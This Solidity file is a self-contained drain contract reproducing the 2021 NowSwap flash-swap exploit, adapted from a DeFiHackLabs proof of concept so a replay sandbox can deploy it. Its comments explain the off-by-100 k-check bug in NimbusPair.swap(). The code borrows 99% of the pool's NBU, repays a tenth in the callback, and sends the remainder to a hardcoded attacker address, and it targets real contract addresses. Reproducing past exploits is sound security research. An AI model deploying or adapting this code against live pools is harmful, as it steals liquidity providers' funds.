// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-09-NowSwap).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is itself the attacker; the flash-swap callback is the test's
// own `fallback()`), so there is no standalone contract to deploy. This contract
// is a faithful, self-contained copy of that inline attack (testExploit body +
// fallback callback) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/NowSwap_exp.sol.
//
// Root cause: NimbusPair.swap()'s k-check scales the LHS adjusted balances by
// 10000 (×10000² in the product) but the RHS reference by only 1000² — a 100×
// gap. A single swap may legally remove up to ~99% of a reserve. The attacker
// asks for 99% of the pool's NBU, repays only 1/10 of it inside the flash
// callback, and keeps the difference.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
}

interface INimbusPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract NowSwapDrain {
    address constant ATTACKER = 0x5676E585bf16387bc159Fd4f82416434Cda5f1A3;
    address constant PAIR = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1; // NimbusPair (USDT/NBU)
    address constant NBU = 0xEB58343b36C7528F23CAAe63a150240241310049;

    // Step 0: ask the pair for 99% of its NBU; the non-empty `data` triggers the
    // flash callback (fallback below), which repays a fraction. Self-financing —
    // no upfront capital, no external flash loan.
    function run() external {
        uint256 amount = IERC20(NBU).balanceOf(PAIR) * 99 / 100;
        INimbusPair(PAIR).swap(0, amount, address(this), abi.encodePacked(amount));
        // Forward any leftover NBU to the attacker EOA.
        IERC20(NBU).transfer(ATTACKER, IERC20(NBU).balanceOf(address(this)));
    }

    // Flash-swap callback (NimbusPair calls NimbusCall, which is absent here, so it
    // falls through to fallback — identical to the original test). Repay only 1/10
    // of the borrowed NBU back to the pair: the off-by-100 k-check still passes.
    fallback() external {
        IERC20(NBU).transfer(PAIR, IERC20(NBU).balanceOf(address(this)) / 10);
    }
}
